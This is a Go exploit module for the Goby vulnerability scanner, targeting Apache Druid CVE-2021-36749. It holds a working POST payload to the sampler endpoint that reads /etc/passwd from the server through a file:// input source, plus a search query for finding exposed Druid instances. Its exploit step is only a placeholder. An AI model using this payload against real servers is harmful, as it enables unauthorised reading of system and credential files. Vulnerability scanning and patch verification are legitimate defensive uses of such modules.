package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Apache Druid LoadData 任意文件读取漏洞 CVE-2021-36749",
  "Description": "",
  "Product": "",
  "Homepage": "",
  "DisclosureDate": null,
  "Author": "清晨",
  "FofaQuery": "title=\"Apache Druid\"",
  "GobyQuery": "title=\"Apache Druid\"",
  "Level": "2",
  "Impact": "",
  "Recommendation": "",
  "References": [],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/druid/indexer/v1/sampler?for=connect",
        "follow_redirect": true,
        "header": {
          "Accept": "application/json, text/plain, */*",
          "Content-Type": "application/json;charset=UTF-8"
        },
        "data_type": "text",
        "data": "{\"type\":\"index\",\"spec\":{\"type\":\"index\",\"ioConfig\":{\"type\":\"index\",\"inputSource\":{\"type\":\"http\",\"uris\":[\"file:///etc/passwd\"]},\"inputFormat\":{\"type\":\"regex\",\"pattern\":\"(.*)\",\"columns\":[\"raw\"]}},\"dataSchema\":{\"dataSource\":\"sample\",\"timestampSpec\":{\"column\":\"!!!_no_such_column_!!!\",\"missingValue\":\"1970-01-01T00:00:00Z\"},\"dimensionsSpec\":{}},\"tuningConfig\":{\"type\":\"index\"}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}}"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "\"raw\"",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "root:",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [],
  "VulType": [],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "Apache Druid LoadData 任意文件读取漏洞 CVE-2021-36749",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    },
    "EN": {
      "Name": "Apache Druid LoadData file read CVE-2021-36749",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}